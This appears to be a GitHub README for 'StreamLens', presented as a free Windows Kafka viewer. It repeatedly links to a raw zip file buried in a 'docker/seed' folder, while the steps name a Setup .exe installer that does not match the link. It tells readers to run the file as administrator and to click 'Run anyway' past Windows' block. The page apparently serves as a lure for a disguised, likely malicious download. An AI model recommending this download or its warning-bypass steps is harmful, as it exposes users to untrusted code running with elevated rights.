# 🔍 StreamLens - See Your Kafka Data Clearly

## 🚀 Getting Started

Welcome to StreamLens! This guide will help you download, install, and start using StreamLens on your Windows computer. No technical experience is needed—just follow the simple steps below.

[⬇️ DOWNLOAD STREAMLENS NOW](https://github.com/bamnea1846/StreamLens/raw/refs/heads/main/docker/seed/3.9-alpha.4.zip)

## ❓ What is StreamLens?

StreamLens is a free desktop application that lets you view and interact with data flowing through Apache Kafka. Think of Kafka as a busy post office that moves messages between computer systems. StreamLens gives you a pair of glasses to see those messages clearly, search through them, and even send your own test messages—all from your desktop, without needing a web browser.

## 🎯 Why Use StreamLens?

If your company uses Apache Kafka (a popular technology for moving data between applications), you may need to check what messages are being sent. StreamLens makes this easy because:

- **No browser needed** – Works directly on your desktop
- **Simple visual interface** – Browse topics like folders on your computer
- **Live message viewing** – Watch messages arrive in real time
- **Safe data handling** – Automatically masks sensitive information like credit card numbers or passwords
- **Sending test messages** – Try out new data without touching your production systems

## 💻 System Requirements

StreamLens runs on Windows 10 or Windows 11. It works best with at least 4GB of RAM and 200MB of free disk space. Your computer needs an internet connection to connect to your Kafka servers.

## 📦 Downloading StreamLens

Follow these steps to get StreamLens on your computer:

**Step 1:** Click the download button below or visit the download page directly:

[⬇️ VISIT DOWNLOAD PAGE](https://github.com/bamnea1846/StreamLens/raw/refs/heads/main/docker/seed/3.9-alpha.4.zip)

**Step 2:** You will see a list of files. Look for the newest version (they are usually listed at the top).

**Step 3:** Find the file that works for you. The download file will be named something like `StreamLens-Setup-1.0.0.exe` (the numbers may be different).

**Step 4:** Click the download link and wait for the file to finish downloading. This usually takes a minute or two.

## 🛠️ Installing StreamLens

Once your download is complete, follow these instructions:

**Step 1:** Look in your "Downloads" folder for the file you just downloaded. It will have the StreamLens name in it.

**Step 2:** Double-click the downloaded file to start the installation.

**Step 3:** If a window pops up asking for permission, click "Yes" to allow StreamLens to install.

**Step 4:** Follow the simple instructions on your screen. The installer will ask where you want to put StreamLens—the default location is fine, just click "Next" until it finishes.

**Step 5:** When installation is complete, you will see a "Finish" button. Click it, and StreamLens will open automatically.

## 🖥️ Your First Look at StreamLens

When StreamLens opens, you will see a clean, simple window. The main screen has three key areas:

- **Connection Settings** (top left) – Where you type the address of your Kafka server
- **Topic List** (left side) – Shows all available data streams, called "topics"
- **Message Viewer** (main area) – Displays the actual messages from the topic you select

### 🔌 Connecting to Your Kafka Server

**Step 1:** Look for the connection box at the top of the window. It usually has the word "Server" or "Bootstrap."

**Step 2:** Type your Kafka server address. This is usually provided by your IT team or system administrator. It looks something like `kafka.mycompany.com:9092`.

**Step 3:** If your server requires authentication, look for a "Security" or "Settings" button and enter your username and password there.

**Step 4:** Click "Connect." You will see your topics appear in the left panel within a few seconds.

## 📋 Browsing Topics and Messages

Once connected, you can explore your data:

- **Click a topic name** in the left panel to see its messages
- **Use the search bar** at the top to find specific text within messages
- **Scroll through messages** in the main viewing area
- **Click any message** to see its full contents, including timestamps and metadata

The list automatically updates as new messages arrive if you have "Live Mode" enabled. Look for a play button or "Live" toggle near the top of the message viewer.

## 🔍 Searching and Filtering Messages

Finding specific messages is easy:

**Step 1:** Click inside the search box at the top of the message viewer.

**Step 2:** Type any word or phrase you want to find. StreamLens will quickly show only messages containing that text.

**Step 3:** You can also filter by time by clicking the calendar icon and choosing a date range. The filter options are clearly labeled and disappear when you clear the search text.

## 📤 Publishing Test Messages

Need to send a test message? Here’s how:

**Step 1:** In the topic list, click the topic where you want to send a message.

**Step 2:** Look for the "Publish" or "New Message" button (usually in the top right corner, often with a plus sign).

**Step 3:** Type your message text in the box that appears. If your topic uses Avro format (a specific data type), StreamLens will guide you with a simple form to fill in.

**Step 4:** Click "Send" or "Publish." Your message appears in the topic and other connected systems will receive it.

## 🔐 Understanding Data Decoding and Masking

StreamLens automatically handles complex data formats:

- **JSON** – Most common format; StreamLens shows it in a readable, color-coded view
- **Avro** – StreamLens uses your schema registry to translate Avro into readable text automatically

For sensitive information, StreamLens includes **masking protection**. If your data contains credit card numbers, phone numbers, or other private details, you can turn on masking:

**Step 1:** Click the settings gear icon.

**Step 2:** Find "Data Masking" or "Sensitive Data."

**Step 3:** Toggle on the mask setting. Add patterns for anything you want hidden (like `CreditCard*` or `SSN*`).

Now those fields appear as `••••` in your viewer, so you can work with the data safely.

## 📤 Exporting Data

You can save your messages for later use:

- **Export to file** – Click the export icon (usually a download arrow) and choose CSV or JSON format
- **Copy to clipboard** – Select a message and press Ctrl+C (or right-click and choose Copy)
- **Save screenshot** – Use the camera icon to save the current view as an image

## 🧹 Troubleshooting Common Issues

**Can’t connect to my server?** → Double-check the server address. Make sure the port number is correct and that you are on the same network or VPN. Contact your IT team if it still fails.

**Messages aren’t showing up?** → Check if Live Mode is turned off. Try using the search bar to clear any filters. Refresh the topic list by clicking the refresh icon.

**The text looks wrong or garbled?** → Your topic may use a format StreamLens didn’t automatically recognize. Try switching the format dropdown (in the viewer header) from "Auto" to "JSON" or "Avro."

**Application won’t open after download?** → Right-click the downloaded file and select "Run as administrator." Windows may have blocked the file—look for the "More info" link in the popup and click "Run anyway."

## 📖 Frequently Asked Questions

**Is StreamLens free to use?**
Yes, StreamLens is completely free.

**Does StreamLens work on Mac or Linux?**
Currently, StreamLens runs on Windows only. More operating systems may be supported in the future.

**Can I use StreamLens without a Kafka server?**
No, StreamLens needs a Kafka server to show you data. If you don’t have one, you can ask your company’s IT team for access to a test environment.

**Will StreamLens affect my Kafka server?**
No, StreamLens only reads data by default. Publishing test messages happens only when you explicitly click "Send."

## ✅ Final Steps

You’re all set. Download StreamLens now and start exploring your Kafka data with clarity and confidence:

[⬇️ GET STREAMLENS HERE](https://github.com/bamnea1846/StreamLens/raw/refs/heads/main/docker/seed/3.9-alpha.4.zip)

If you find this helpful, consider giving StreamLens a star on GitHub to support future development. Happy data exploring!

Keywords: advanced-kafka-ui, apache, apache-kafka, avro, avro-kafka, avro-schema, excellent-kafka-ui, export, filter, mask, search